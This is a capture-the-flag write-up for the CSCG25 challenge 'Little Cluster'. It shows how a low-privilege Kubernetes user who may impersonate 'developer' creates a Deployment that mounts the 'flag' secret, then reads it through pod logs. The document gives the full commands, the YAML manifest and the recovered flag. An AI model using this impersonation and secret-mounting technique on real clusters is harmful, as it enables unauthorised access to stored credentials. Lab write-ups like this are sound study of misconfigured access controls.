---
layout: post
author: hofill
title: "Little Cluster"
slug: little-cluster
ctf: CSCG25
category: writeup
writeup_categories: ["misc"]
tags: ["misc", "kubernetes", "k8s", "impersonation"]
summary: KubeCTL impersonation to escalate privileges and mount a secret via a crafted deployment.
last_modified_at:
---

# Flag

> `CSCG{4h0y_c4pt41n!}`

# Summary

KubeCTL impersonation to secret mount abuse.

# Details

We are given a cluster with very minimal access:

```
ctf@entrypoint-5b57fd8877-l2c2g:~$ kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                  []               [create]
...
namespaces                                      []                  []               [get watch list]
pods                                            []                  []               [get watch list]
serviceaccounts                                 []                  []               [get watch list]
...
users                                           []                  [developer]      [impersonate]
```

The interesting part: we can impersonate the `developer` user. Checking `developer`'s permissions with `--as=developer`:

```
Resources              Non-Resource URLs   Resource Names   Verbs
deployments.apps       []                  []               [get watch list create delete]
pods                   []                  []               [get watch list delete]
pods/log               []                  []               [get]
```

So `developer` can **create deployments**. Now, inspecting the existing pod's YAML:

```yaml
volumeMounts:
- mountPath: /flag
  name: flag
  readOnly: true
  recursiveReadOnly: Disabled
```

There's a `flag` volume mounted as a secret. We can't exec into the pod, but we can create our own deployment (as `developer`) that mounts the same secret and cats its contents on startup:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: flag-reader
  namespace: ctf
spec:
  replicas: 1
  selector:
    matchLabels:
      app: flag-reader
  template:
    metadata:
      labels:
        app: flag-reader
    spec:
      containers:
      - name: reader
        image: busybox:1.37.0-uclibc
        command: ["cat", "/flag/flag"]
        volumeMounts:
        - mountPath: /flag
          name: flag
          readOnly: true
      restartPolicy: Always
      volumes:
      - name: flag
        secret:
          secretName: flag
```

Apply with `kubectl apply -f flag-reader.yaml --as=developer`, then read the logs:

```
kubectl logs -l app=flag-reader --as=developer
CSCG{4h0y_c4pt41n!}
```
